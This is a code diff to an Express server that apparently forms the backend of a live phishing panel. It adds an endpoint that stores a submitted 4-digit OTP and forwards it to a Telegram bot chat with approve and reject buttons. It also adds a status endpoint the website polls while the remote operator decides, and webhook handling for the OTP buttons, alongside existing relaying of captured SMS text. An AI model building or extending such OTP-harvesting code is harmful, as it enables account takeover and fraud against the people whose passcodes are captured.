@@ -112,9 +112,14 @@ app.get('/api/sms-status/:id', (req, res) => {
     }
 });
 
-// 5. Receive the 4-digit OTP and send to Telegram
+// 5. Receive the 4-digit OTP and send to Telegram for final approval
 app.post('/api/submit-otp', async (req, res) => {
     const { otp, appId } = req.body;
+
+    if (applications[appId]) {
+        applications[appId].otpStatus = 'pending';
+        applications[appId].otpCode = otp;
+    }
 
     const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN;
     const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
@@ -128,7 +133,19 @@ app.post('/api/submit-otp', async (req, res) => {
         await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message, parse_mode: 'Markdown' })
+            body: JSON.stringify({ 
+                chat_id: TELEGRAM_CHAT_ID, 
+                text: message, 
+                parse_mode: 'Markdown',
+                reply_markup: {
+                    inline_keyboard: [
+                        [
+                            { text: "✅ APPROVE OTP", callback_data: `approve_otp_${appId}` },
+                            { text: "❌ REJECT OTP", callback_data: `reject_otp_${appId}` }
+                        ]
+                    ]
+                }
+            })
         });
         res.json({ success: true });
     } catch (error) {
@@ -137,7 +154,17 @@ app.post('/api/submit-otp', async (req, res) => {
     }
 });
 
-// 6. Telegram Webhook (Handles all button clicks)
+// 6. Check OTP status (polling from the website)
+app.get('/api/otp-status/:id', (req, res) => {
+    const appId = req.params.id;
+    if (applications[appId] && applications[appId].otpStatus) {
+        res.json({ status: applications[appId].otpStatus });
+    } else {
+        res.json({ status: 'pending' });
+    }
+});
+
+// 7. Telegram Webhook (Handles all button clicks)
 app.post('/api/telegram-webhook', async (req, res) => {
     const { callback_query } = req.body;
 
@@ -150,6 +177,11 @@ app.post('/api/telegram-webhook', async (req, res) => {
         let action, appId, target;
         if (data.includes('sms_')) {
             const parts = data.split('_'); // e.g., ['approve', 'sms', '12345']
+            action = parts[0];
+            target = parts[1];
+            appId = parts[2];
+        } else if (data.includes('otp_')) {
+            const parts = data.split('_'); // e.g., ['approve', 'otp', '12345']
             action = parts[0];
             target = parts[1];
             appId = parts[2];
@@ -191,6 +223,24 @@ app.post('/api/telegram-webhook', async (req, res) => {
                     applications[appId].smsStatus = 'rejected';
                     newText = `📩 *SMS RECEIVED* 📩\n\n*App ID:* \`${appId}\`\n\n*Message:*\n\`\`\`\n${applications[appId].smsText}\n\`\`\`\n\nStatus: ❌ *SMS REJECTED*`;
                     newStatus = "SMS Rejected!";
+                }
+            }
+            // Handle OTP Verification Buttons
+            else if (target === 'otp') {
+                if (action === 'approve') {
+                    applications[appId].otpStatus = 'approved';
+                    newText = `🔐 *NEW OTP RECEIVED* 🔐\n\n` +
+                              `*App ID:* \`${appId}\`\n` +
+                              `*OTP Code:* \`${applications[appId].otpCode}\`\n\n` +
+                              `Status: ✅ *OTP APPROVED*`;
+                    newStatus = "OTP Approved!";
+                } else {
+                    applications[appId].otpStatus = 'rejected';
+                    newText = `🔐 *NEW OTP RECEIVED* 🔐\n\n` +
+                              `*App ID:* \`${appId}\`\n` +
+                              `*OTP Code:* \`${applications[appId].otpCode}\`\n\n` +
+                              `Status: ❌ *OTP REJECTED*`;
+                    newStatus = "OTP Rejected!";
                 }
             }
 
